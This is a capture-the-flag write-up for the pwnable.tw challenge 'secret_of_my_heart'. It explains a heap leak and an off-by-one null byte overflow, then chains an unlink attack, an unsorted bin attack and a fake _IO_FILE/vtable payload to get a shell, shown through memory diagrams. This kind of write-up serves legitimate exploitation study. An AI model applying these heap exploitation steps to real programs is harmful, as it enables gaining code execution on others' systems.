# Pwnable tw - secret_of_my_heart 

First, check its protection info.
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

We can simply see there are two vulnerabilites in the binary.

- In the ```add_secret``` the input of name without null byte, so we can leak ```heap address```
- After we input the ```secret```, it will add a null byte padding behind our payload. It will cause ```off by one null byte heap overflow```

After leaking heap address, we can launch unlink attack by making a fake pointer on the heap, so we will not revise the original pointer.

```
		0x00005615ddaf6030
 		------------------------------------------
secret[1] ->	|0x0000000000000000      0x0000000000000091|
fake fd,bk->	|0x00005615ddaf60c8      0x00005615ddaf60d0|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
		|0x4141414141414141      0x4141414141414141|
				
		 0x00005615ddaf60c0
		 ------------------------------------------ 
secret[2] ->	|0x0000000000000090      0x0000000000000100|
		|0x0000000000000000      0x0000000000000000|
fake ptr ->	|0x00005615ddaf6030      0x0000000000000000|
		|0x0000000000000000      0x0000000000000000|
		|0x0000000000000000      0x0000000000000000|
		        ...			...
```

After ```del_secret(2)```, we can simple leak ```libc``` by ```show_secret(1)```

However, It's difficult to overwrite ```_malloc_hook```. 
I decided to use```FILE stream oriented programming``` to solve it. ([source](http://blog.angelboy.tw/))

First, I cosolidate all the chunk on the heap. However, we still have secret[1] pointer. 
So, there is a overlap chunk at ```0x00005615ddaf6030```, and heap top at ```0x00005615ddaf6000```

Next, add three secret with size 0x40(```secret[0]```), 0x80(```secret[2]```), and 0x80(```secret[3]```), respectively.
Our goal is launching unsorted bin attack on secret[2] chunk. In the first chunk, we modify the secret[1] chunk header to 0x81. And secret[3] make our partial fake ```_IO_FILE```, ```vtable```, ```wide_date``` objects.

#### _IO_FILE structure
```
0x00:		 -----------------------------
		|        '/bin/sh\x00'        |
		 -----------------------------
		|                             |
		|                             |
		|           ......	       |
		|                             |
		|                             |
0xa0:		 -----------------------------
		|        wide_date ptr	       |
		 -----------------------------
		|            ...              |
		|            ...              |
0xc0:		 -----------------------------
		|            mode	       |
		 -----------------------------
		|            ...	       |
		 -----------------------------
		|            ...	       |
		 -----------------------------
		|          vtable ptr	       |
0xe0:		 -----------------------------
```
#### wide_data structure
```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
    ...
    ...
}
 
 ```

#### vtable structure
```c
struct _IO_jump_t
{
    JUMP_FIELD(_G_size_t, __dummy);
#ifdef _G_USING_THUNKS
    JUMP_FIELD(_G_size_t, __dummy2);
#endif
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
     ...
     ...
}
```

Then ```del_secret(1)``` and ```del_secret(2)```, since ```secret[1]``` size is fastbin size. 
```secret[1]``` will be append to ```fastbin[6]```, ```secret[2]``` will be added to ```unsorted bin```.

When we add a secret with size 0x78, will get original ```secret[1]``` overlaping with unsorted bin chunk.
Thus, we have full ```unsorted bin attack``` and ```FILE stream programming payload```

```
				    0x00005615ddaf6000
                                  ------------------------------------------
                secret[0] ->     |0x0000000000000000      0x0000000000000051|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
				
				    0x00005615ddaf6030
                                  ------------------------------------------
        original secret[1] ->    |0x0000000000000000      0x0000000000000081|
                                 |0x0000000000000000      0x0000000000000000|


				    0x00005615ddaf6050
                                  ------------------------------------------
secret[2], _IO_FILE object ->    |0x0068732f6e69622f      0x0000000000000061|
                                 |0x00007fcd76793b78      0x00007fcd76794510|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
				
				    0x00005615ddaf60e0
                                  ------------------------------------------
                 secret[3] ->    |0x0000000000000090      0x0000000000000090|
        fake wide_date ptr ->    |0x00005615ddaf6120      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000001      0x0000000000000000|
           fake vtable ptr ->    |0x0000000000000000      0x00005615ddaf6150|
                                 |0x0000000000000001      0x0000000000000002|
                                 |0x0000000000000003      0x0000000000000000|
                                 |0x0000000000000000      0x0000000000000000|
                                 |0x0000000000000000      0x00007fcd76415390|
                 top chunk ->    |0x0000000000000000      0x0000000000020e91|
```







